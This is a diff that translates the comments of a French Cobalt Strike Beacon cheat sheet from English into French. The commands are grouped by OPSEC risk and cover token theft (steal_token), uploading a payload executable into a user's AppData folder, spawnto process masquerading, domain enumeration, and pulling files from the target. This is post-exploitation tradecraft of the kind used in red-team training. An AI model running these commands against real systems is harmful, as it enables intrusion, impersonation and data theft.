@@ -14,13 +14,13 @@ Dans la console Cobalt Strike, un double-clic sur un Beacon ouvre l'onglet **Int
 ## Commandes Beacon — OPSEC SAFE
 
 ```
-getuid                      # Who am I? (domain\user + integrity level)
-ls                      # Directory listing (default: current dir)
-pwd                     # Current working directory
-env                     # Environment variables
-whoami /groups          # (via shell — OPSEC-UNSAFE, use carefully)
+getuid                      # Identité courante (domaine\utilisateur et niveau d’intégrité)
+ls                      # Lister les fichiers (dossier courant par défaut)
+pwd                     # Afficher le répertoire courant
+env                     # Afficher les variables d’environnement
+whoami /groups          # (via shell — OPSEC-UNSAFE, à utiliser avec prudence)
 process_browser
-steal_token 0000            # Impersonated User on current beacon host
+steal_token 0000            # Utilisateur impersonné sur l’hôte du Beacon
 
 cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
 upload C:\Payloads\http_x64.exe
@@ -38,16 +38,16 @@ spawnto x64 %windir%\sysnative\notepad.exe
 
 download C:\path\to\file.xxx
 
-beacon> net localgroup          # Local group memberships
-beacon> net computers           # Enumerate domain computers (via NetAPI)
-beacon> ipconfig                # Network config
-beacon> netstat                 # Active connections
+beacon> net localgroup          # Appartenance aux groupes locaux
+beacon> net computers           # Énumérer les ordinateurs du domaine via NetAPI
+beacon> ipconfig                # Afficher la configuration réseau
+beacon> netstat                 # Afficher les connexions actives
 ```
 
 ## Commandes Beacon — OPSEC CAUTION
 
 ```
-shell schtasks          # list current scheduled task on beacon host
+shell schtasks          # Lister les tâches planifiées sur l’hôte du Beacon
 
 ```
 
@@ -59,14 +59,14 @@ shell schtasks          # list current scheduled task on beacon host
 ## File System — Fichiers
 
 ```
-beacon> ls                      # List current directory
-beacon> ls C:\Users             # List specific path
-beacon> cd C:\Windows\Temp      # Change directory
-beacon> pwd                     # Print working directory
-beacon> mkdir C:\Temp\loot      # Create directory
-beacon> rm C:\Temp\file.txt     # Delete file
-beacon> download C:\file.txt    # Download file to CS client
-beacon> upload /local/file.exe  # Upload file from CS client to target
+beacon> ls                      # Lister le dossier courant
+beacon> ls C:\Users             # Lister le chemin indiqué
+beacon> cd C:\Windows\Temp      # Changer de répertoire
+beacon> pwd                     # Afficher le chemin courant
+beacon> mkdir C:\Temp\loot      # Créer un dossier
+beacon> rm C:\Temp\file.txt     # Supprimer un fichier
+beacon> download C:\file.txt    # Télécharger le fichier vers le client Cobalt Strike
+beacon> upload /local/file.exe  # Envoyer un fichier du client Cobalt Strike vers la cible
 ```
 
 ---
